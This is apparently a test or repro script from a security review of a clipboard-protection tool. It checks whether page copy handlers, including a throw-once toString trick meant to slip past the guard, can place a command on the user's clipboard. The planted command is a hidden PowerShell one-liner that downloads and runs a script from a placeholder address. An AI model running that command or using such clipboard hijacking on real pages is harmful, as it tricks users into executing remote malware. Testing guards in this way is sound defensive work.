import { start } from "docs/review-2026-11-16/repros/guards-lens/harness.mjs";
const CMD = "powershell -w hidden -nop -c \"iex (iwr 'http://203.0.113.5/a.ps1')\"";
const { ctx, base, close } = await start({ "/": `<body><button id=b>go</button><script>window.CMD=${JSON.stringify(CMD)}</script>` });
const page = await ctx.newPage();
page.on("console", (m) => { if (!m.text().includes("404")) console.log("   console:", m.text()); });
await page.goto(base + "/");
await page.waitForTimeout(500);
const once = `({ n: 0, toString() { if (this.n++ === 0) throw new Error('first'); return CMD; } })`;
for (const [name, fn] of [
  ["control: setData(CMD) in copy handler", `() => { document.addEventListener('copy', function h(e){ document.removeEventListener('copy', h); e.clipboardData.setData('text/plain', CMD); e.preventDefault(); }); document.execCommand('copy'); }`],
  ["setData(throw-once object) in copy handler", `() => { document.addEventListener('copy', function h(e){ document.removeEventListener('copy', h); try { e.clipboardData.setData('text/plain', ${once}); } catch (x) { console.log('threw', x.message); } e.preventDefault(); }); document.execCommand('copy'); }`],
  ["items.add(throw-once object) in copy handler", `() => { document.addEventListener('copy', function h(e){ document.removeEventListener('copy', h); try { e.clipboardData.items.add(${once}, 'text/plain'); } catch (x) { console.log('threw', x.message); } e.preventDefault(); }); document.execCommand('copy'); }`],
]) {
  await page.evaluate(() => navigator.clipboard.writeText("clean"));
  await page.evaluate(`document.getElementById('b').onclick = ${fn}; 0`);
  await page.click("#b");
  await page.waitForTimeout(700);
  const got = await page.evaluate(() => navigator.clipboard.readText());
  console.log(name.padEnd(50), got.includes("powershell") ? "COMMAND ON CLIPBOARD" : "no command: " + JSON.stringify(got));
}
await close();
